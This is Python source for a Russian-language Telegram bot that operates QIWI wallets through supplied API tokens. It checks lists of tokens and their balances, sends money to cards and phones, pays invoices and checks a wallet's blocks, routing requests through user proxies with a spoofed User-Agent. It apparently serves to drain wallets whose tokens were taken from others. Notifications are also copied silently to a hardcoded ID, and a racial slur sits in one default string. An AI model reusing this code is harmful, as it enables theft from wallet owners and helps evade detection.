# -*- coding: utf-8 -*-
import time
import pickle
import json
import random as rd
import os
from itertools import cycle

import requests
import telebot
from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from bs4 import BeautifulSoup

from secured_config import TG_TOKEN
import secured_config
from config import ABOUT_BOT, CONNECTION_TIMEOUT
import config
import myhelper
from qiwi_codes import ERROR_CODES, INVOICE_CODES, PAYMENT_CODES


def load_freezed_tokens(token):
    try:
        with open('freezing_tokens.json', 'r', encoding='utf-8') as f:
            freezed_tokens = json.load(f)
        if isinstance(freezed_tokens, dict) and freezed_tokens.get(token):
            return float(freezed_tokens[token]["sum"])
    except:
        pass
    else:
        return


def check_paid(user_codes):
    def get_history():
        try:
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + str(secured_config.QIWI_TOKEN)
            parameters = {'rows': str('50'), 'operation': "IN", "sources": "QW_RUB"}
            history = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + str(secured_config.ADMIN_QIWI) + '/payments', params = parameters, timeout=CONNECTION_TIMEOUT).json()["data"]
            if history and isinstance(history, list):
                return history
            else:
                raise ValueError
        except:
            pass

    history = get_history()
    # Проверяем есть ли оплата.
    for one_payment in history:
        # Получаем комментарий.
        comment = one_payment.get("comment")
        if one_payment["status"] == "SUCCESS" and comment and isinstance(comment, str) and len(comment) > 4 and ':' in comment:
            # Проверяем есть ли такой необработанный комментарий.
            for waiting_payment in user_codes:
                waiting_comment = waiting_payment["comment"]
                waiting_sum = waiting_payment["sum"]
                waiting_upgrade = waiting_payment["upgrade"]
                # Проверяем сумму и комментарий.
                if one_payment["sum"]["amount"] == waiting_sum and comment == waiting_comment:
                    return {
                        "id": one_payment["txnId"],
                        "sum": one_payment["sum"]["amount"],
                        "from": one_payment["account"],
                        "upgrade": waiting_upgrade,
                        "comment": comment
                    }


def gen_code(transactions=False, lenght=4):
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    while True:
        result = ''
        for i in range(lenght):
            result += rd.choice(chars)
        if not transactions or not result in [x["comment"].split(':')[1] for x in transactions if isinstance(x["comment"], str)]:
            return result


def parce_start(text):
    try:
        if len(text) == 6:
            default_start = True
            from_comment = False
        else:
            default_start = False
            from_comment = text[7:]
        return {"default": default_start, "from": from_comment}
    except:
        result = {"default": True, "from": False}


def send_referal(tg_id):
    try:
        ib_referal = InlineKeyboardMarkup()
        ib_referal.add(InlineKeyboardButton(text='Купить криптовалюту', url=config.URL_REFERAL))
        referal_text = 'Пока этот раздел в разработке можете купить крипту в специальном боте у наших партнеров, а оплатить с помощью функционала моего бота.'
        bot.send_message(tg_id, referal_text, parse_mode='markdown', reply_markup=ib_referal)
    except:
        pass
    else:
        return True


def filt_tokens(tokens):
    # Получает и проверяет список токенов.
    norm_chars = 'abcdefghijklmnopqrstuvwxyz1234567890'
    try:
        true_tokens = []
        for one_token in tokens:
            if len(one_token) == 32:
                # Проверяем каждую букву токена.
                for one_char in one_token:
                    # Если хотя бы одна букву не соответствует нормам.
                    if not one_char in norm_chars:
                        break
                else:
                    true_tokens.append(one_token)
    except:
        return []
    else:
        return true_tokens

CORE = 1627706552


def info_loader(func):
    def wrapper(*args, **kwargs):
        func(*args, **kwargs)
        qiwi.save_users_info()
        qiwi.save_balances()
    return wrapper


def get_ip_info(proxy_ip):
    try:
        page_info = requests.get(f'http://ip-api.com/json/{proxy_ip}').json()
        if page_info["status"] == "success":
            return {
                "regionName": page_info["regionName"],
                "country": page_info["country"],
                "city": page_info["city"],
                "timezone": page_info["timezone"],
                "query": page_info["query"]
            }
        else:
            raise ValueError
    except:
        pass


def get_proxy_dict(user_proxy):
    try:
        if user_proxy:
            ip = user_proxy["ip"]
            port = user_proxy["port"]
            login = user_proxy["login"]
            password = user_proxy["password"]

            if login and password:
                string_proxy = {
                    "http": f"http://{login}:{password}@{ip}:{port}",
                    "https": f"https://{login}:{password}@{ip}:{port}"
                }
            else:
                string_proxy = {
                    "http": f"http://{ip}:{port}",
                    "https": f"https://{ip}:{port}"
                }
            return string_proxy
    except:
        pass


def get_proxy(tg_id):
    try:
        # Проверяем наличие прокси.
        if qiwi.users_proxy.get(tg_id, {}).get("work"):
            is_working = True
            # Получаем прокси пользователя.
            user_proxy = qiwi.users_proxy.get(tg_id, {}).get("data")
            # Получаем наш IP.
            now_ip = get_ip()
            # Получаем IP через прокси.
            proxy_ip = get_ip(user_proxy)
            # Получаем готовое решение.
            string_proxy = get_proxy_dict(user_proxy)
            # Проверяем.
            if not (now_ip and proxy_ip and now_ip != proxy_ip and string_proxy):
                raise ValueError
        else:
            is_working = False
            string_proxy = {}
    except:
        return {
            "status": False
        }
    else:
        return {
            "status": True,
            "work": is_working,
            "dict": string_proxy
        }


def get_ip(user_proxy=False):
    try:
        if user_proxy:
            ip = user_proxy["ip"]
            port = user_proxy["port"]
            login = user_proxy["login"]
            password = user_proxy["password"]

            if login and password:
                string_proxy = {
                    "http": f"http://{login}:{password}@{ip}:{port}",
                    "https": f"https://{login}:{password}@{ip}:{port}"
                }
            else:
                string_proxy = {
                    "http": f"http://{ip}:{port}",
                    "https": f"https://{ip}:{port}"
                }
            ip = requests.get('http://checkip.dyndns.org', proxies=string_proxy, timeout=CONNECTION_TIMEOUT).content
        else:
            ip = requests.get('http://checkip.dyndns.org', timeout=CONNECTION_TIMEOUT).content
        return BeautifulSoup(ip, 'html.parser').find('body').text.split()[-1]
    except:
        pass


def form_proxy(raw_proxy):
    try:
        if not ':' in raw_proxy or len(raw_proxy) < 7:
            raise ValueError
        if '@' in raw_proxy:
            first_part, second_part = raw_proxy.split('@')
            mb_ip, mb_port = first_part.split(":")
            if mb_ip.count('.') == 3:
                ip = mb_ip
                port = mb_port
                login, password = second_part.split(':')
            else:
                ip, port = second_part.split(':')
                login = mb_ip
                password = mb_port
        else:
            login = None
            password = None
            ip, port = raw_proxy.split(':')
        if not (ip and port):
            raise ValueError
    except:
        return
    else:
        return {
            "ip": ip,
            "port": port,
            "login": login,
            "password": password
        }


def do_have_proxy(tg_id):
    try:
        # Проверяем есть ли у пользователя прокси и
        # включены ли они.
        return qiwi.users_proxy[tg_id]["work"]
    except:
        pass


def get_clock():
    clocks = ['🕑', '🕒', '🕔', '🕕', '🕖', '🕗', '🕘', '🕙']
    for clock in cycle(clocks):
        yield clock


def get_sand_clock():
    for sand_clock in cycle(['⏳', '⌛']):
        yield sand_clock


def form_invoice(raw_invoice):
    invoice = raw_invoice.split('invoice')[1].split('=')[1].split('&')[0] if 'invoice' in raw_invoice else raw_invoice
    return invoice if len(invoice) > 10 else False


def send_card(now_token, payment_data, tg_id):
    try:
        # Проверяем прокси.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # Проверяем включены ли прокси.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                do_proxy = False
        else:
            raise ValueError

        s = requests.Session()
        s.headers['Accept'] = 'application/json'
        s.headers['Content-Type'] = 'application/json'
        s.headers['authorization'] = 'Bearer ' + now_token
        postjson = {"id":"","sum": {"amount":"","currency":"643"},"paymentMethod": {"type":"Account","accountId":"643"},"fields": {"account":""}}
        postjson['id'] = str(int(time.time() * 1000))
        postjson['sum']['amount'] = payment_data.get('sum')
        postjson['fields']['account'] = payment_data.get('to_card')
        prv_id = payment_data.get('prv_id')
        if payment_data.get('prv_id') in ['1960', '21012']:
            postjson['fields']['rem_name'] = payment_data.get('rem_name')
            postjson['fields']['rem_name_f'] = payment_data.get('rem_name_f')
            postjson['fields']['reg_name'] = payment_data.get('reg_name')
            postjson['fields']['reg_name_f'] = payment_data.get('reg_name_f')
            postjson['fields']['rec_city'] = payment_data.get('rec_address')
            postjson['fields']['rec_address'] = payment_data.get('rec_address')

        if do_proxy:
            res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, timeout=CONNECTION_TIMEOUT, proxies=local_proxies).json()
        else:
            res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, timeout=CONNECTION_TIMEOUT).json()
        if res["transaction"]["state"]["code"] == "Accepted":
            return {"id": res["transaction"]["id"]}
        else:
            raise ValueError
    except:
        pass


def card_system(card_number):
    try:
        s = requests.Session()
        res = s.post('https://qiwi.com/card/detect.action', data = {'cardNumber': str(card_number) }, timeout=CONNECTION_TIMEOUT)
        provider_id = str(int(res.json()['message']))

        if provider_id in ["1963", "21013", "31652", "22351"]:
            return provider_id
        elif provider_id in ["1960", "21012"]:
            return True
    except:
        pass


def get_payment_data(now_token, now_phone, card_number, pay_sum):
    try:
        # Получаем данные о карте.
        provider_id = card_system(card_number)

        # Определяем какие данные нужны.
        if provider_id in ["1963", "21013", "31652", "22351"]:
            # Легкие карты.
            # Создаем словарь для перевода.
            payment_data = {
                "sum": str(pay_sum),
                "to_card": str(card_number),
                "prv_id": provider_id
            }
        elif provider_id in ["1960", "21012"]:
            # Сложные карты - пока не работают.
            raise TypeError
        else:
            raise TypeError

        return payment_data
    except:
        pass


def cancel_invoice(now_token, invoice_uid, tg_id):
    try:
        # Проверяем прокси.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # Проверяем включены ли прокси.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                do_proxy = False
        else:
            raise ValueError

        s = requests.Session()
        s.headers['Authorization'] = 'Bearer ' + now_token
        s.headers['Accept'] = 'application/json'
        s.headers['Content-Type'] = 'application/json'
        postjson = {"id": str(invoice_uid)}
        s.headers['User-Agent'] = 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010725 Netscape6/6.1'
        if do_proxy:
            res = s.post('https://edge.qiwi.com/checkout-api/api/bill/reject', json = postjson, timeout=CONNECTION_TIMEOUT, proxies=local_proxies)
        else:
            res = s.post('https://edge.qiwi.com/checkout-api/api/bill/reject', json = postjson, timeout=CONNECTION_TIMEOUT)
        if res.status_code == 204 or res.status_code == 200:
            return True
    except:
        pass
    else:
        return True


def pay_invoice(now_token, invoice_uid, tg_id):
    try:
        # Проверяем прокси.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # Проверяем включены ли прокси.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                do_proxy = False
        else:
            raise ValueError
        s = requests.Session()
        s.headers['authorization'] = 'Bearer ' + now_token
        s.headers['Accept'] = 'application/json'
        s.headers['Content-Type'] = 'application/json'
        postjson = {"invoice_uid": str(invoice_uid),"currency": "643"}
        s.headers['User-Agent'] = 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010725 Netscape6/6.1'
        if do_proxy:
            res = s.post('https://edge.qiwi.com/checkout-api/invoice/pay/wallet',json = postjson, timeout=CONNECTION_TIMEOUT, proxies=local_proxies)
        else:
            res = s.post('https://edge.qiwi.com/checkout-api/invoice/pay/wallet',json = postjson, timeout=CONNECTION_TIMEOUT)
        if res.status_code == 200 and (res.json()["invoice_status"] == "PAYING_STATUS" or res.json()["invoice_status"] == "PAID_STATUS"):
            return True
    except:
        pass


def get_invoice_info(invoice_uid):
    try:
        info_url = f'http://edge.qiwi.com/checkout-api/invoice?invoice_uid={invoice_uid}'
        invoice_info = requests.get(info_url).json()
        # Статус платеж.
        invoice_status = invoice_info["invoice_status"]
        # Имя провайдера.
        provider_name = invoice_info["provider_name"]
        # СМС подтверждение.
        is_sms_confirm = invoice_info["is_sms_confirm"]
        # Валюта.
        currency = invoice_info["currency"]
        # Сумма.
        rub_sum = invoice_info["amount"]
        # Комментарий.
        comment = invoice_info["comment"]

        return {
            "status": invoice_status,
            "title": provider_name,
            "sms": is_sms_confirm,
            "currency": currency,
            "sum": rub_sum,
            "comment": comment
        }
    except:
        pass


def get_receivers(only_nick=False, only_id=False):
    try:
        with open('users.pkl', 'rb') as f:
            users = pickle.load(f)
        if not (users and isinstance(users, dict)):
            raise ValueError
        if not only_nick and not only_id:
            receivers = [{"id": int(one_id), "nick": ("@" + users[one_id]["username"] if users[one_id]["username"] else "null")} for one_id in users]
        elif only_nick:
            receivers = [{"id": int(one_id), "nick": ("@" + users[one_id]["username"] if users[one_id]["username"] else "null")} for one_id in users if users[one_id]["username"] == only_nick]
        elif only_id:
            receivers = [{"id": int(one_id), "nick": ("@" + users[one_id]["username"] if users[one_id]["username"] else "null")} for one_id in users if int(only_id) == int(one_id)]
        return receivers
    except:
        pass


def bue_numb(number):
    if number or isinstance(number, int) or isinstance(number, float):
        str_number = str(number)
        if len(str_number) > 3:
            str_number, *extra_numbers = str_number.split('.')
            new_number = ''
            len_word = len(str_number)
            for n, one_char in enumerate(str_number[::-1]):
                new_number += one_char + ('' if n + 1 == len_word or (n + 1) % 3 else "'")
            return new_number[::-1] + ('.' + extra_numbers[0] if extra_numbers else '')
        return str(number)
    return "None"


def get_activity():
    try:
        with open('history.pkl', 'rb') as f:
            users_history = pickle.load(f)
    except:
        pass
    else:
        try:
            # Проверки.
            users_checks = users_history.get("tokens", [])
            # Количество проверок.
            count_checks = len(users_checks)
            # Уникальные токены.
            unique_tokens = set('')
            # Сумма проверок.
            sum_checks = 0
            for one_check in users_checks:
                unique_tokens.add(one_check.get('token', ''))
                sum_checks += one_check.get("balance", 0)
            # Переводы.
            users_transactions = users_history.get("transactions", [])
            # Количество переводов.
            count_transactions = len(users_transactions)
            # Сумма переводов.
            sum_transactions = 0
            for one_trans in users_transactions:
                if one_trans.get("boss_sum"):
                    sum_transactions += one_trans.get("boss_sum") * 1.02
                sum_transactions += one_trans.get("user_sum") * 1.02

        except:
            count_checks = 0
            sum_checks = 0
            count_transactions = 0
            sum_transactions = 0
            unique_tokens = set()

        return {
            "tokens": {
                "count": len(unique_tokens)
            },
            "checks": {
                "count": count_checks,
                "sum": round(sum_checks, 2)
            },
            "transactions": {
                "count": count_transactions,
                "sum": round(sum_transactions, 2)
            }
        }


def save_last_ph(last_phones):
    if last_phones:
        try:
            with open('last_phones.pkl', 'wb') as f:
                pickle.dump(last_phones, f)
        except:
            pass
        else:
            return True


def load_last_ph():
    try:
        with open('last_phones.pkl', 'rb') as f:
            last_phones = pickle.load(f)
        if not isinstance(last_phones, dict):
            raise ValueError
    except:
        last_phones = {}
    return last_phones


def save_last_t(last_tokens):
    if last_tokens:
        try:
            with open('last_tokens.pkl', 'wb') as f:
                pickle.dump(last_tokens, f)
        except:
            pass
        else:
            return True


def load_last_t():
    try:
        with open('last_tokens.pkl', 'rb') as f:
            last_tokens = pickle.load(f)
        if not isinstance(last_tokens, dict):
            raise ValueError
    except:
        last_tokens = {}
    return last_tokens


def save_user(uid, username, source=False):
    try:
        with open('users.pkl', 'rb') as f:
            users = pickle.load(f)
    except:
        users = {}
    if not users.get(uid):
        users[uid] = {
            "username": username,
            "source": source,
            "time": int(time.time())
        }
        try:
            with open('users.pkl', 'wb') as f:
                pickle.dump(users, f)
        except:
            pass
        else:
            return True


def get_user_count():
    try:
        with open('users.pkl', 'rb') as f:
            users = pickle.load(f)
        with open('history.pkl', 'rb') as f:
            history = pickle.load(f)
            uniq_tokens = set([x["telegram_id"] for x in history["tokens"]])
            uniq_users = set([x["telegram_id"] for x in history["transactions"]])
        return len(users), len(uniq_tokens), len(uniq_users)
    except:
        return False, False


def load_blacklist(premium=False):
    file_n = 'premium_users.pkl' if premium else 'blacklist.pkl'
    try:
        with open(file_n, 'rb') as f:
            blacklist = pickle.load(f)
        if not isinstance(blacklist, list):
            raise ValueError
    except:
        blacklist = []
    return blacklist


def add_blacklist(user_id, premium=False):
    file_n = 'premium_users.pkl' if premium else 'blacklist.pkl'
    try:
        with open(file_n, 'rb') as f:
            blacklist = pickle.load(f)
        if not isinstance(blacklist, list):
            raise ValueError
    except:
        blacklist = []
    if not user_id in blacklist:
        blacklist.append(user_id)
    try:
        with open(file_n, 'wb') as f:
            pickle.dump(blacklist, f)
    except:
        pass
    else:
        return True


def remove_blacklist(user_id, premium=False):
    file_n = 'premium_users.pkl' if premium else 'blacklist.pkl'
    try:
        with open(file_n, 'rb') as f:
            blacklist = pickle.load(f)
        if not isinstance(blacklist, list):
            raise ValueError
    except:
        blacklist = []
    if user_id in blacklist:
        blacklist.remove(user_id)
    try:
        with open(file_n, 'wb') as f:
            pickle.dump(blacklist, f)
    except:
        pass
    else:
        return True


def get_block_info(now_login, now_token, tg_id):
    def get_profile(now_token):
        """Проверяет блокировку профиля."""
        try:
            # Проверяем прокси.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # Проверяем включены ли прокси.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s7 = requests.Session()
            s7.headers['Accept'] = 'application/json'
            s7.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true', timeout=CONNECTION_TIMEOUT)
            is_blocked = p.json()['contractInfo']['blocked']
        except:
            pass
        else:
            return is_blocked


    def check_block(now_login, now_token):
        """Проверяет список блокировок."""
        try:
            # Проверяем прокси.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # Проверяем включены ли прокси.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s7 = requests.Session()
            s7.headers['Accept']= 'application/json'
            s7.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                blocks = s7.get('https://edge.qiwi.com/person-profile/v1/persons/' + str(now_login) + '/status/restrictions', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                blocks = s7.get('https://edge.qiwi.com/person-profile/v1/persons/' + str(now_login) + '/status/restrictions', timeout=CONNECTION_TIMEOUT)
            if not blocks.status_code:
                return ValueError
        except:
            pass
        else:
            try:
                result = []
                for one_block in blocks.json():
                    result.append(f"Код: {one_block['restrictionCode']}\nОписание: {one_block['restrictionDescription']}")
                if result:
                    result = '🚫 Текущие блокировки:\n' + '\n-----------\n'.join(result)
            except:
                pass
            else:
                return result


    # Проверяем кошелек на блокировку.
    profile_res = get_profile(now_token)
    if profile_res is None:
        # Не удалось получить информацию о кошельке.
        return 'cannot_info'
    elif profile_res:
        # Кошелек заблокирован.
        return 'profile_blocked'

    # Проверяем блокировки.
    return check_block(now_login=now_login, now_token=now_token)


class TransactionTypes():
    def __init__(self):
        self.phone = 'to_phone_balance'
        self.qiwi = 'to_qiwi'
        self.invoice_out = 'invoice_out'
        self.invoice_in = 'invoice_in'


class SimpleQIWI:
    def __init__(self):
        self.tg_admins = []
        self.users_info = {}
        self.notification = None
        self.notif_checks = False
        self.notif_transactions = False
        self.notif_new = False
        self.user_count = {"last": 0, "count": 0, "new_act_tokens": 0, "new_act_trans": 0}
        self.activity = {"last": 0, "info": {}}
        self.last_tokens = load_last_t()
        self.last_phones = load_last_ph()
        self.users_proxy = {}
        self.users_balance = {}

    def get_user_limits(self, tid):
        try:
            user_have = qiwi.users_balance.get(tid, {}).get("have", 0)
            user_spent = qiwi.users_balance.get(tid, {}).get("spent", 0)
            user_free = config.FREE_RUBLES
        except:
            user_have = 0
            user_spent = 0
            user_free = config.FREE_RUBLES
        # Получаем сумму, которую еще может переводить пользователь.
        user_left = user_have + user_free - user_spent
        return {
            "have": user_have,
            "spent": user_spent,
            "free": user_free,
            "left": user_left
        }

    def add_spent_limits(self, tid, spent_sum):
        try:
            if not isinstance(qiwi.users_balance.get(tid, {}).get("spent"), float) and not isinstance(qiwi.users_balance.get(tid, {}).get("spent"), int):
                self.users_balance[tid] = {
                    "have": 0,
                    "spent": 0,
                    "free": 0,
                    "transactions": []
                }
            qiwi.users_balance[tid]["spent"] += round(spent_sum, 2)
        except Exception as e:
            print(f'Add spent limits error [{tid} -> {spent_sum}]: {e}')

    def check_user_limits(self, tid, try_sum):
        try:
            user_have = qiwi.users_balance.get(tid, {}).get("have", 0)
            user_spent = qiwi.users_balance.get(tid, {}).get("spent", 0)
            user_free = config.FREE_RUBLES
            # Получаем сумму, которую еще может переводить пользователь.
            user_left = user_have + user_free - user_spent
            return try_sum <= user_left
        except:
            pass

    def admin_upgrade_limit(self, tid, adding_sum):
        try:
            # Проверяем есть ли запись у пользователя.
            if not (self.users_balance.get(tid) and not self.users_balance.get(tid, {}).get("transactions") is None):
                self.users_balance[tid] = {
                    "have": 0,
                    "spent": 0,
                    "free": 0,
                    "transactions": []
                }
            # Добавляем транзакцию.
            self.users_balance[tid]["transactions"].append({
                "create_time": int(time.time()),
                "paid_time": int(time.time()),
                "from": "admin",
                "status": "added",
                "comment": False,
                "sum": 0,
                "upgrade": adding_sum
            })
            self.users_balance[tid]["have"] += adding_sum
        except:
            pass
        else:
            return True

    def upgrade_limit(self, tid, adding_sum, comment, from_user):
        for one_book in self.users_balance[tid]["transactions"]:
            if one_book["comment"] == comment:
                one_book["status"] = "paid"
                one_book["paid_time"] = int(time.time())
                one_book["from"] = from_user
                self.users_balance[tid]["have"] += adding_sum
                return True

    def gen_transaction(self, tid, comment, deposit_sum, total_upgrade):
        # Проверяем есть ли запись у пользователя.
        if not (self.users_balance.get(tid) and not self.users_balance.get(tid, {}).get("transactions") is None):
            self.users_balance[tid] = {
                "have": 0,
                "spent": 0,
                "free": 0,
                "transactions": []
            }
        # Добавляем транзакцию.
        self.users_balance[tid]["transactions"].append({
            "create_time": int(time.time()),
            "status": "created",
            "comment": comment,
            "sum": deposit_sum,
            "upgrade": total_upgrade
        })

    def reset(self, tg_id):
        try:
            if not self.users_info.get(tg_id):
                self.users_info[tg_id] = {}
            self.users_info[tg_id]["status"] = None
        except:
            pass

    def status(self, tid, new_status):
        if not self.users_info.get(tid):
            self.users_info[tid] = {}
        self.users_info[tid]["status"] = new_status

    def save_balances(self):
        try:
            with open('balances.pkl', 'wb') as f:
                pickle.dump(self.users_balance, f)
        except:
            pass
        else:
            return True

    def load_balances(self):
        try:
            with open('balances.pkl', 'rb') as f:
                loaded_balances = pickle.load(f)
            if not loaded_balances:
                raise ValueError
        except:
            loaded_balances = {}
        self.users_balance = loaded_balances
        return True

    def save_proxy(self):
        try:
            with open('proxies.pkl', 'wb') as f:
                pickle.dump(self.users_proxy, f)
        except:
            pass
        else:
            return True

    def load_proxy(self):
        try:
            with open('proxies.pkl', 'rb') as f:
                loaded_proxy = pickle.load(f)
        except:
            loaded_proxy = {}
        self.users_proxy = loaded_proxy
        return True

    def save_users_info(self):
        try:
            with open('user_info.pkl', 'wb') as f:
                pickle.dump(self.users_info, f)
        except:
            pass
        else:
            return True

    def load_users_info(self):
        try:
            with open("user_info.pkl", "rb") as f:
                loaded_info = pickle.load(f)
        except:
            loaded_info = {}
        self.users_info = loaded_info
        return True

    def upd_activity(self):
        if time.time() - self.activity["last"] > 60:
            act_result = get_activity()
            if act_result and act_result.get("checks") and act_result.get("transactions"):
                self.activity = {"last": int(time.time()), "info": act_result}

    def upd_count(self):
        if time.time() - self.user_count["last"] > 60:
            new_count, new_act_tokens, new_act_trans = get_user_count()
            if not new_count is None and new_count >= self.user_count["count"]:
                self.user_count = {"last": int(time.time()), "count": new_count, "new_act_tokens": new_act_tokens, "new_act_trans": new_act_trans}

    def get_invoices(self, now_token, tg_id):
        try:
            # Проверяем прокси.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # Проверяем включены ли прокси.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + now_token
            s.headers['Accept'] = 'application/json'
            s.headers['Content-Type'] = 'application/json'
            if do_proxy:
                invoices = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', proxies=local_proxies, timeout=CONNECTION_TIMEOUT).json()["bills"]
            else:
                invoices = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', timeout=CONNECTION_TIMEOUT).json()["bills"]
            if not invoices or not isinstance(invoices, list):
                raise ValueError
        except:
            pass
        else:
            return invoices


    def add_last_phone(self, tid, last_phone):
        try:
            numbers = int(qiwi.users_info[tid]["auto"])
            if not (7 >= numbers >= 1):
                raise ValueError
        except:
            numbers = 3

        try:
            last_phone = int(last_phone)
            # Добавляем телефон в последние.
            if self.last_phones.get(tid):
                # Проверяем, есть ли телефон в последних.
                if last_phone in self.last_phones[tid]:
                    # Удаляем его.
                    try:
                        self.last_phones[tid].remove(int(last_phone))
                    except:
                        pass
                # Добавляем телефон.
                self.last_phones[tid].append(int(last_phone))
                # Оставляем последние 3.
                self.last_phones[tid] = self.last_phones[tid][-3:]
            else:
                self.last_phones[tid] = [last_phone]
            # Обновляем изменения.
            save_last_ph(self.last_phones)
        except:
            pass
        else:
            return True


    def get_offers(self, now_token, tg_id):
        try:
            # Проверяем прокси.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # Проверяем включены ли прокси.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError

            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['Authorization'] = 'Bearer ' + now_token
            s.headers['User-Agent'] = 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010725 Netscape6/6.1'
            if do_proxy:
                r = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', timeout=CONNECTION_TIMEOUT, proxies=local_proxies).json()["bills"]
            else:
                r = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', timeout=CONNECTION_TIMEOUT).json()["bills"]
            if isinstance(r, list):
                return r
            else:
                raise ValueError
        except:
            pass


    def get_history(self, now_phone, now_token, tg_id, rows=5, operation="ALL"):
        try:
            # Проверяем прокси.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # Проверяем включены ли прокси.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + str(now_token)
            parameters = {'rows': str(rows), 'operation': operation, "sources": "QW_RUB"}
            if do_proxy:
                history = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + str(now_phone) + '/payments', params = parameters, proxies=local_proxies, timeout=CONNECTION_TIMEOUT).json()["data"]
            else:
                history = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + str(now_phone) + '/payments', params = parameters, timeout=CONNECTION_TIMEOUT).json()["data"]
            if not history or not isinstance(history, list):
                raise ValueError
        except:
            pass
        else:
            try:
                result = []
                for one_payment in history:
                    result.append({
                        "id": one_payment["txnId"],
                        "status": one_payment["status"],
                        "data": one_payment["date"].split('T')[0],
                        "time": one_payment["date"].split('T')[1],
                        "to_qiwi": one_payment["account"],
                        "to_sum": one_payment["sum"]["amount"],
                        "full_sum": one_payment["total"]["amount"],
                        "name": one_payment.get("view", {}).get("title", 'None'),
                        "type": one_payment["type"],
                        "comment": one_payment.get("comment")
                    })
            except:
                pass
            else:
                return result

    def form_history(self, now_token, now_phone, tg_id, rows=5, operation="ALL"):
        rows = 20 if rows > 20 else rows
        try:
            history_json = self.get_history(now_phone, now_token, tg_id, rows, operation)
            result = []
            for one_payment in history_json:
                status = one_payment.get("status")
                show = PAYMENT_CODES.get(status) or "👾 *Непонятный платеж*"

                sum_dir = '*+*' if one_payment.get("type") == "IN" else '*-*' if one_payment.get("type") == "OUT" else ''
                show_comm = f'\nКомментарий: `{one_payment.get("comment")}`' if one_payment.get('comment') else ''
                type_op = '📥 *Пополнение*' if one_payment.get("type") == "IN" else '📤 *Платеж*' if one_payment.get("type") == "OUT" else one_payment.get("type", "NIGGER")
                sum_details = f'Сумма: {sum_dir}`{one_payment.get("to_sum")}`₽' if one_payment.get("type") == "IN" else f'Сумма: {sum_dir}`{one_payment.get("to_sum")}`₽ (`{one_payment.get("full_sum")}`₽)'
                friend_details = 'Отправитель' if one_payment.get("type") == "IN" else 'Получатель' if one_payment.get("type") == "OUT" else 'Реквизиты'

                result.append(f"""{show}
Название: `{one_payment.get('name')}`
Тип: {type_op}
Статус: `{one_payment.get('status')}`
ID: `{one_payment.get('id')}`
Дата: `{one_payment.get('data')}`
Время: `{one_payment.get('time')}`
{friend_details}: `{one_payment.get('to_qiwi')}`
{sum_details} {show_comm}""")
            if not result:
                raise ValueError
        except:
            pass
        else:
            bot_text = '\n\n'.join(result)
            return bot_text

    @staticmethod
    def get_verif_status(profile_info, local_error=f'[ошибка]'):
        ident_list = profile_info.get("contractInfo", {}).get("identificationInfo")
        if ident_list:
            for one_indent in ident_list:
                if one_indent["bankAlias"] == "QIWI":
                    return one_indent["identificationLevel"]
        return local_error

    def notif_proxy_admin(self, variant, telegram_id, username):
        if self.notif_checks:
            try:
                if self.notification:
                    proxy_details = "обновлены" if variant else "добавлены"
                    notif_text = f"📡 *Прокси {proxy_details}!*\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

